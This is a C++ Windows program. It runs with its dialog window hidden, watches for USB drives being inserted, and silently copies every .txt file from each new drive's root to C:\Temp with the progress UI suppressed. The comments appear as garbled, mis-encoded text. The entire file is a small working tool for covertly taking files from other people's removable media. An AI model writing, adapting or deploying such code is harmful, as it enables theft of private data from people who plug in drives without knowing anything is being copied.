#include <Windows.h>
#include <Dbt.h>
#include <stdio.h>
#include <iostream>
#include "resource.h"

// �����Լ���Ҫ�޸�
// Ŀǰ���� SHFileOperation ����ʵ�ָ��ƣ�Ŀǰ������ U �̸�Ŀ¼�ϵ� txt �ļ�
// ��� API ���Ը����ļ��У�·������˫\0
void DoAction(char letter) {
  char from[100] = "X:\\*.txt\0";   
  from[0] = letter;
  SHFILEOPSTRUCTA s = { 0 };
  s.wFunc = FO_COPY;
  s.fFlags = FOF_NO_UI;   // ����ʾ����
  s.pTo = "C:\\Temp\0";   // Ŀ��·����ȥ���·����
  s.pFrom = from;
  SHFileOperationA(&s);
}


INT_PTR CALLBACK DialogProc(HWND hDlg, UINT uMsg, WPARAM wParam,
                            LPARAM lParam) {
  switch (uMsg) {
  // �豸�仯֪ͨ
  case WM_DEVICECHANGE:
    // ֻ�������룬 DBT_DEVICEREMOVECOMPLETE �ǰγ�
    if (DBT_DEVICEARRIVAL == wParam) {
      PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
      switch (pHdr->dbch_devicetype) {
      case DBT_DEVTYP_VOLUME: {
        PDEV_BROADCAST_VOLUME pDevVolume = (PDEV_BROADCAST_VOLUME)pHdr;

        // ��ȡ�̷�
        for (int i = 0; i < 26; i++) {
          if (pDevVolume->dbcv_unitmask & (1 << i)) {
            char letter = 'A' + i;
            DoAction(letter);
          }
        }
        break;
      }
      }
    }
    break;
  case WM_COMMAND:
    switch (LOWORD(wParam)) {
    case IDCANCEL:
      SendMessage(hDlg, WM_CLOSE, 0, 0);
      return TRUE;
    }
    break;

  case WM_CLOSE:
    if (MessageBox(hDlg, TEXT("Close the program?"), TEXT("Close"),
                   MB_ICONQUESTION | MB_YESNO) == IDYES) {
      DestroyWindow(hDlg);
    }
    return TRUE;

  case WM_DESTROY:
    PostQuitMessage(0);
    return TRUE;
  }

  return FALSE;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE h0, LPSTR lpCmdLine, int nCmdShow) {
  HWND hDlg;
  MSG msg;
  BOOL ret;

  hDlg =
    CreateDialogParam(hInst, MAKEINTRESOURCE(IDD_DIALOG1), 0, DialogProc, 0);

  // Ĭ�����ؽ��棬��SW_HIDE
  // ShowWindow(hDlg, nCmdShow); 
  ShowWindow(hDlg, SW_HIDE);

  while ((ret = GetMessage(&msg, 0, 0, 0)) != 0) {
    if (ret == -1) return -1;
    if (!IsDialogMessage(hDlg, &msg)) {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }
  }

  return 0;
}